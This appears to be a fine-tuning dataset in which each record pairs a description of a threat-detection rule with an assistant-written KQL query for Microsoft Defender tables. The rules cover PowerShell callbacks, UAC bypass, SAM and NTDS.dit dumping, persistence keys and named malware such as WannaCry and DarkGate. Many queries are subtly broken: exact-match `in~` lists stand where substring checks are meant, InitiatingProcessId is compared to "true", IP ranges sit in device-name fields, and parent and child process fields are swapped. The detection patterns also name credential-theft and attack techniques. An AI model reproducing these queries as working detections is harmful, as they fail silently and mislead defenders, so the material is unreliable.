{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection that was initiated from a PowerShell process.\nOften times malicious powershell scripts download additional payloads or communicate back to command and control channels via uncommon ports or IPs.\nUse this rule as a basis for hunting for anomalies.\n Topic: net_connection_win_powershell_network_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not((((InitiatingProcessAccountName in~ (\"AUTHORI\", \"AUTORI\")) and (InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"169.254.0.0/16\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))) or (InitiatingProcessRemoteSessionDeviceName in~ (\"20.184.0.0/13\", \"51.103.210.0/23\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53) Topic: registry_set_uac_bypass_sdclt"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Software\\\\Classes\\\\exefile\\\\shell\\\\runas\\\\command\\\\isolatedCommand\" or (RegistryKey endswith \"Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\\SymbolicLinkValue\" and RegistryValueData matches regex \"-1[0-9]{3}\\\\\\\\Software\\\\\\\\Classes\\\\\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An attacker may execute an application as a SCR File using rundll32.exe desk.cpl,InstallScreenSaver Topic: proc_creation_win_rundll32_installscreensaver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"InstallScreenSaver\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable initiating a network connection to \"ngrok\" domains.\nAttackers were seen using this \"ngrok\" in order to store their second stage payloads and malware.\nWhile communication with such domains can be legitimate, often times is a sign of either data exfiltration by malicious actors or additional download.\n Topic: net_connection_win_domain_ngrok"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\".ngrok-free.app\", \".ngrok-free.dev\", \".ngrok.app\", \".ngrok.dev\", \".ngrok.io\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of rundll32 with a command line that doesnt contain a common extension Topic: proc_creation_win_rundll32_uncommon_dll_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and (not((ProcessCommandLine =~ \"\" or ((ProcessCommandLine contains \".cpl \" or ProcessCommandLine contains \".cpl,\" or ProcessCommandLine contains \".cpl\\\"\" or ProcessCommandLine contains \".cpl'\" or ProcessCommandLine contains \".dll \" or ProcessCommandLine contains \".dll,\" or ProcessCommandLine contains \".dll\\\"\" or ProcessCommandLine contains \".dll'\" or ProcessCommandLine contains \".inf \" or ProcessCommandLine contains \".inf,\" or ProcessCommandLine contains \".inf\\\"\" or ProcessCommandLine contains \".inf'\") or (ProcessCommandLine endswith \".cpl\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".inf\")) or ProcessCommandLine =~ \" -localserver \" or isnull(ProcessCommandLine) or (InitiatingProcessFileName =~ \"\\\\msiexec.exe\" and (ProcessCommandLine in~ (\":\\\\Windows\\\\Installer\\\\\", \".tmp\", \"zzzzInvokeManagedCustomActionOutOfProc\")))))) and (not((InitiatingProcessCommandLine in~ (\":\\\\Users\\\\\", \"\\\\AppData\\\\Local\\\\Microsoft\\\\EdgeUpdate\\\\Install\\\\{\", \"\\\\EDGEMITMP_\", \".tmp\\\\setup.exe\", \"--install-archive=\", \"--previous-version=\", \"--msedgewebview --verbose-logging --do-not-launch-msedge --user-level\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation indicators related to PaperCut MF/NG Exploitation Topic: proc_creation_win_papercut_print_management_exploitation_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /c \", \"powershell\", \"-nop -w hidden\", \"Invoke-WebRequest\", \"setup.msi\", \"-OutFile\")) or (ProcessCommandLine in~ (\"msiexec \", \"/i \", \"setup.msi \", \"/qn \", \"IntegratorLogin=fimaribahundq\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a service binary running in a suspicious directory Topic: proc_creation_win_susp_service_dir"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\$Recycle.bin\" or FolderPath contains \"\\\\Users\\\\All Users\\\\\" or FolderPath contains \"\\\\Users\\\\Default\\\\\" or FolderPath contains \"\\\\Users\\\\Contacts\\\\\" or FolderPath contains \"\\\\Users\\\\Searches\\\\\" or FolderPath contains \"C:\\\\Perflogs\\\\\" or FolderPath contains \"\\\\config\\\\systemprofile\\\\\" or FolderPath contains \"\\\\Windows\\\\Fonts\\\\\" or FolderPath contains \"\\\\Windows\\\\IME\\\\\" or FolderPath contains \"\\\\Windows\\\\addins\\\\\") and (InitiatingProcessFileName in~ (\"\\\\services.exe\", \"\\\\svchost.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious change of file privileges with chown and chmod commands Topic: proc_creation_lnx_setgid_setuid"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" chmod u+s\", \" chmod g+s\")) and ProcessCommandLine =~ \"chown root\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect creation of suspicious executable file names.\nSome strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.\n Topic: file_event_win_susp_executable_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\$Recycle.Bin.exe\", \":\\\\Documents and Settings.exe\", \":\\\\MSOCache.exe\", \":\\\\PerfLogs.exe\", \":\\\\Recovery.exe\", \".bat.exe\", \".sys.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects handles requested to SAM registry hive Topic: win_security_sam_registry_hive_handle_request"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SAM\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification to the \"Default\" value of the \"MyComputer\" key and subkeys to point to a custom binary that will be launched whenever the associated action is executed (see reference section for example) Topic: registry_set_persistence_mycomputer"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\MyComputer\" and RegistryKey endswith \"(Default)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452 Topic: proc_creation_win_rundll32_inline_vbs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rundll32.exe\", \"Execute\", \"RegRead\", \"window.close\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications related to the proxy configuration of the system, potentially associated with the Raspberry Robin malware, as seen in campaigns running in Q1 2024.\nRaspberry Robin may alter proxy settings to circumvent security measures, ensuring unhindered connection with Command and Control servers for maintaining control over compromised systems if there are any proxy settings that are blocking connections.\n Topic: registry_set_malware_raspberry_robin_internet_settings_zonemap_tamper"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (((InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\Downloads\\\\\" or InitiatingProcessFolderPath contains \"\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\Windows\\\\Temp\\\\\") or InitiatingProcessFolderPath endswith \"\\\\control.exe\") and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap*\") and (((RegistryKey endswith \"\\\\IntranetName\" or RegistryKey endswith \"\\\\ProxyByPass\" or RegistryKey endswith \"\\\\UNCAsIntranet\") and RegistryValueData contains \"DWORD (0x00000001)\") or (RegistryKey endswith \"\\\\AutoDetect\" and RegistryValueData contains \"DWORD (0x00000000)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n Topic: proc_creation_win_reg_nolmhash"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\", \"NoLMHash\", \" 0\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage and installation of a backdoor that uses an option to register a malicious debugger for built-in tools that are accessible in the login screen Topic: registry_event_stickykey_like_backdoor"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\osk.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\Magnify.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\Narrator.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\DisplaySwitch.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\atbroker.exe\\\\Debugger\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\HelpPane.exe\\\\Debugger\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a file named \"ntds.dit\" (Active Directory Database) by an uncommon process or a process located in a suspicious directory Topic: file_event_win_ntds_dit_uncommon_process"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\ntds.dit\" and ((InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\", \"\\\\wsl.exe\", \"\\\\wt.exe\")) or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\\" or InitiatingProcessFolderPath contains \"\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\PerfLogs\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local network configuration Topic: proc_creation_macos_susp_system_network_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFolderPath in~ (\"/arp\", \"/ifconfig\", \"/netstat\", \"/networksetup\", \"/socketfilterfw\")) or (FolderPath =~ \"/usr/bin/defaults\" and (ProcessCommandLine in~ (\"/Library/Preferences/com.apple.alf\", \"read\")))) and (not(InitiatingProcessFileName =~ \"/wifivelocityd\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of a new value in the Autorun key that is used by the Kapeka backdoor for persistence. Topic: registry_set_malware_kapeka_backdoor_autorun_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" and (RegistryKey endswith \"\\\\Sens Api\" or RegistryKey endswith \"\\\\OneDrive\") and (RegistryValueData contains \":\\\\WINDOWS\\\\system32\\\\rundll32.exe\" and RegistryValueData contains \".wll\" and RegistryValueData contains \"#1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the PurpleSharp adversary simulation tool Topic: proc_creation_win_hktl_purplesharp_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"xyz123456.exe\", \"PurpleSharp\")) or (FolderPath contains \"\\\\purplesharp\" or ProcessVersionInfoOriginalFileName =~ \"PurpleSharp.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution of Sysinternals PsSuspend, where the utility is used to suspend critical processes such as AV or EDR to bypass defenses Topic: proc_creation_win_sysinternals_pssuspend_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"msmpeng.exe\" and (ProcessVersionInfoOriginalFileName =~ \"pssuspend.exe\" or (FolderPath endswith \"\\\\pssuspend.exe\" or FolderPath endswith \"\\\\pssuspend64.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a new user profile with a specific username, seen being used by some variants of the COLDSTEEL RAT. Topic: registry_set_malware_coldsteel_created_users"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProfileList\\\\S-1-5-21-\" and RegistryKey contains \"\\\\ProfileImagePath\") and (RegistryValueData contains \"ANONYMOUS\" or RegistryValueData contains \"_DomainUser_\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the dump of highly sensitive files such as \"NTDS.DIT\" and \"SECURITY\" hive.\nAttackers can leverage the \"wbadmin\" utility in order to dump sensitive files that might contain credential or sensitive information.\n Topic: proc_creation_win_wbadmin_dump_sensitive_files"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"start\", \"backup\")) and (FolderPath endswith \"\\\\wbadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"WBADMIN.EXE\") and (ProcessCommandLine in~ (\"\\\\config\\\\SAM\", \"\\\\config\\\\SECURITY\", \"\\\\config\\\\SYSTEM\", \"\\\\Windows\\\\NTDS\\\\NTDS.dit\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific child/parent process relationship indicative of a \"WerFault\" process running from the \"WinSxS\" as a service. This could be indicative of potential SNAKE malware activity as reported by CISA. Topic: proc_creation_win_malware_snake_service_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\services.exe\" and InitiatingProcessFolderPath =~ \"\\\\WerFault.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects SILENTTRINITY stager use via PE metadata Topic: proc_creation_win_hktl_silenttrinity_stager"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription contains \"st2stager\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable Topic: proc_creation_win_powershell_service_dacl_modification_set_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\pwsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"pwsh.dll\") and (ProcessCommandLine in~ (\"-SecurityDescriptorSddl \", \"-sd \")) and (ProcessCommandLine in~ (\"Set-Service \", \"D;;\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local systeam accounts on MacOS Topic: proc_creation_macos_local_account"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"list\", \"/users\")) and InitiatingProcessFolderPath =~ \"/dscl\") or ((ProcessCommandLine in~ (\"-q\", \"user\")) and InitiatingProcessFolderPath =~ \"/dscacheutil\") or ProcessCommandLine =~ \"'x:0:'\" or ((ProcessCommandLine in~ (\"/etc/passwd\", \"/etc/sudoers\")) and InitiatingProcessFolderPath =~ \"/cat\") or InitiatingProcessFolderPath =~ \"/id\" or (ProcessCommandLine =~ \"-u\" and InitiatingProcessFolderPath =~ \"/lsof\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities to discover files and directories Topic: proc_creation_macos_file_and_directory_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine matches regex \"(.){200,}\" and FolderPath =~ \"/usr/bin/file\") or FolderPath =~ \"/usr/bin/find\" or FolderPath =~ \"/usr/bin/mdfind\" or (FolderPath =~ \"/bin/ls\" and ProcessCommandLine =~ \"-R\") or FolderPath =~ \"/tree\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability Topic: proc_creation_win_lolbin_pcwrun_follina"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"../\" and InitiatingProcessFolderPath =~ \"\\\\pcwrun.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects listing or file reading of \".dockerenv\" which can be a sing of potential container discovery Topic: proc_creation_lnx_susp_dockerenv_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine endswith \".dockerenv\" and (InitiatingProcessFolderPath in~ (\"/cat\", \"/dir\", \"/find\", \"/ls\", \"/stat\", \"/test\", \"grep\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects programs on a Windows system that should not write an archive to disk Topic: file_event_win_susp_legitimate_app_dropping_archive"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\".zip\", \".rar\", \".7z\", \".diagcab\", \".appx\")) and (InitiatingProcessFolderPath in~ (\"\\\\winword.exe\", \"\\\\excel.exe\", \"\\\\powerpnt.exe\", \"\\\\msaccess.exe\", \"\\\\mspub.exe\", \"\\\\eqnedt32.exe\", \"\\\\visio.exe\", \"\\\\wordpad.exe\", \"\\\\wordview.exe\", \"\\\\certutil.exe\", \"\\\\certoc.exe\", \"\\\\CertReq.exe\", \"\\\\Desktopimgdownldr.exe\", \"\\\\esentutl.exe\", \"\\\\finger.exe\", \"\\\\notepad.exe\", \"\\\\AcroRd32.exe\", \"\\\\RdrCEF.exe\", \"\\\\mshta.exe\", \"\\\\hh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of local users via the net.exe command with the name of \"DarkGate\" Topic: proc_creation_win_malware_darkgate_net_user_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"user\", \"add\", \"DarkGate\", \"SafeMode\")) and (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Shadow Copies storage symbolic link creation using operating systems utilities Topic: proc_creation_win_cmd_mklink_shadow_copies_access_symlink"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"mklink\", \"HarddiskVolumeShadowCopy\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant Topic: proc_creation_win_apt_apt29_phishing_campaign_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \"-noni -ep bypass $\" or (ProcessCommandLine contains \"cyzfc.dat,\" and ProcessCommandLine contains \"PointFunctionCall\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of DISM to enable the PowerShell Web Access feature, which could be used for remote access and potential abuse Topic: proc_creation_win_dism_enable_powershell_web_access_feature"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"WindowsPowerShellWebAccess\", \"/online\", \"/enable-feature\")) and (FolderPath endswith \"\\\\dism.exe\" or ProcessVersionInfoOriginalFileName =~ \"DISM.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects password change for the computers domain account or host principal via \"ksetup.exe\" Topic: proc_creation_win_ksetup_password_change_computer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /setcomputerpassword \" and (FolderPath endswith \"\\\\ksetup.exe\" or ProcessVersionInfoOriginalFileName =~ \"ksetup.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated Powershell via VAR++ LAUNCHER Topic: proc_creation_win_hktl_invoke_obfuscation_via_var"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"{0}\", \"{1}\", \"{2}\", \"{3}\", \"{4}\", \"{5}\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64 where the extensions of the file is suspicious Topic: proc_creation_win_certutil_encode_susp_extensions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-encode\" or ProcessCommandLine contains \"/encode\" or ProcessCommandLine contains \"\u2013encode\" or ProcessCommandLine contains \"\u2014encode\" or ProcessCommandLine contains \"\u2015encode\") and (ProcessCommandLine in~ (\".acl\", \".bat\", \".doc\", \".gif\", \".jpeg\", \".jpg\", \".mp3\", \".pdf\", \".png\", \".ppt\", \".tmp\", \".xls\", \".xml\")) and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WannaCry ransomware activity Topic: proc_creation_win_malware_wannacry"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\tasksche.exe\" or FolderPath endswith \"\\\\mssecsvc.exe\" or FolderPath endswith \"\\\\taskdl.exe\" or FolderPath endswith \"\\\\taskhsvc.exe\" or FolderPath endswith \"\\\\taskse.exe\" or FolderPath endswith \"\\\\111.exe\" or FolderPath endswith \"\\\\lhdfrgui.exe\" or FolderPath endswith \"\\\\linuxnew.exe\" or FolderPath endswith \"\\\\wannacry.exe\") or FolderPath contains \"WanaDecryptor\") or ((ProcessCommandLine contains \"icacls\" and ProcessCommandLine contains \"/grant\" and ProcessCommandLine contains \"Everyone:F\" and ProcessCommandLine contains \"/T\" and ProcessCommandLine contains \"/C\" and ProcessCommandLine contains \"/Q\") or (ProcessCommandLine contains \"bcdedit\" and ProcessCommandLine contains \"/set\" and ProcessCommandLine contains \"{default}\" and ProcessCommandLine contains \"recoveryenabled\" and ProcessCommandLine contains \"no\") or (ProcessCommandLine contains \"wbadmin\" and ProcessCommandLine contains \"delete\" and ProcessCommandLine contains \"catalog\" and ProcessCommandLine contains \"-quiet\") or ProcessCommandLine contains \"@Please_Read_Me@.txt\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious powershell download cradle using nslookup. This cradle uses nslookup to extract payloads from DNS records Topic: proc_creation_win_nslookup_poweshell_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and (ProcessCommandLine in~ (\" -q=txt \", \" -querytype=txt \"))) and (FolderPath contains \"\\\\nslookup.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\nslookup.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential privilege escalation attempt via the creation of the \"*.Exe.Local\" folder inside the \"System32\" directory in order to sideload \"comctl32.dll\" Topic: file_event_win_system32_local_folder_privilege_escalation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\comctl32.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to create a DLL file to a known desktop application dependencies folder such as Slack, Teams or OneDrive and by an unusual process. This may indicate an attempt to load a malicious module via DLL search order hijacking. Topic: file_event_win_initial_access_dll_search_order_hijacking"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName in~ (\"\\\\Microsoft\\\\OneDrive\\\\\", \"\\\\Microsoft OneDrive\\\\\", \"\\\\Microsoft\\\\Teams\\\\\", \"\\\\Local\\\\slack\\\\app-\", \"\\\\Local\\\\Programs\\\\Microsoft VS Code\\\\\")) and (InitiatingProcessFolderPath in~ (\"\\\\winword.exe\", \"\\\\excel.exe\", \"\\\\powerpnt.exe\", \"\\\\MSACCESS.EXE\", \"\\\\MSPUB.EXE\", \"\\\\fltldr.exe\", \"\\\\cmd.exe\", \"\\\\certutil.exe\", \"\\\\mshta.exe\", \"\\\\cscript.exe\", \"\\\\wscript.exe\", \"\\\\curl.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not(((FileName in~ (\"\\\\Users\\\\\", \"\\\\AppData\\\\\", \"\\\\Microsoft\\\\OneDrive\\\\\", \"\\\\api-ms-win-core-\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious command line arguments of common data compression tools Topic: proc_creation_win_susp_compression_params"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessVersionInfoOriginalFileName contains \"7z\" and ProcessVersionInfoOriginalFileName contains \".exe\") or ProcessVersionInfoOriginalFileName endswith \"rar.exe\" or (ProcessVersionInfoOriginalFileName contains \"Command\" and ProcessVersionInfoOriginalFileName contains \"Line\" and ProcessVersionInfoOriginalFileName contains \"RAR\")) and (ProcessCommandLine in~ (\" -p\", \" -ta\", \" -tb\", \" -sdel\", \" -dw\", \" -hp\"))) and (not((InitiatingProcessFileName in~ (\":\\\\Program Files\\\\\", \":\\\\Program Files (x86)\\\\\"))))"}]}
